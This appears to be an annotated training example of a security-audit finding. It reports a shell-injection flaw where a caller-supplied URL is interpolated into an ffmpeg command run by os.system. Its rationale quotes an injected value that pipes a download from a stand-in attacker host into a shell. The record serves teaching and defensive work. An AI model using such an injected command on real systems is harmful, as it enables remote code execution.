note: A real finding. Teaches the shape of a correct report: the sink expression is copied verbatim, the invariant is named rather than restated as the CWE, and the untrusted source is a specific expression.

findings.functional_intent: Queue a media conversion by shelling out to ffmpeg for a caller-supplied source URL.
findings.violated_safety_invariant: Nothing establishes that the URL is a single shell token; it is interpolated into a command string that /bin/sh will parse, so shell metacharacters in it become syntax.
findings.title: Shell metacharacters in ffmpeg source URL
findings.rationale: The url query parameter is interpolated into a string passed to os.system, which runs it through a shell. A value such as `x; curl attacker.example | sh` executes as a second command.
